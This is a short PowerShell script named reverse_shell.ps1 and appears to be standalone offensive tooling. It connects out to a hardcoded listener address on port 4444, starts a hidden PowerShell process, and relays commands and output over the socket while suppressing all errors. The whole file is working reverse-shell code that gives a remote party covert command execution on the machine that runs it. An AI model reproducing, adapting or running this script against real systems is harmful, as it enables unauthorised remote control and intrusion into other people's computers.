# reverse_shell.ps1

$LHOST = "192.168.87.246"
$LPORT = 4444

try {
    # Create TCP client and connect
    $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
    $stream = $client.GetStream()

    # Create StreamReader and StreamWriter for network stream
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true
    $reader = New-Object System.IO.StreamReader($stream)

    # Configure PowerShell process with redirected IO
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "powershell.exe"
    $psi.RedirectStandardInput = $true
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow = $true

    $process = New-Object System.Diagnostics.Process
    $process.StartInfo = $psi
    $process.Start() | Out-Null

    $stdin = $process.StandardInput
    $stdout = $process.StandardOutput
    $stderr = $process.StandardError

    # Main loop
    while ($client.Connected) {
        # Send output lines from PowerShell process to remote client
        while (-not $stdout.EndOfStream) {
            $line = $stdout.ReadLine()
            $writer.WriteLine($line)
        }

        while (-not $stderr.EndOfStream) {
            $line = $stderr.ReadLine()
            $writer.WriteLine($line)
        }

        # Read command from remote client and send to PowerShell stdin
        if ($stream.DataAvailable) {
            $cmd = $reader.ReadLine()
            if ($cmd -eq "exit") {
                break
            }
            $stdin.WriteLine($cmd)
            $stdin.Flush()
        }

        Start-Sleep -Milliseconds 100
    }

    # Cleanup
    $stdin.Close()
    $stdout.Close()
    $stderr.Close()
    $process.Close()
    $writer.Close()
    $reader.Close()
    $stream.Close()
    $client.Close()

} catch {
    # Handle errors silently or log if needed
}
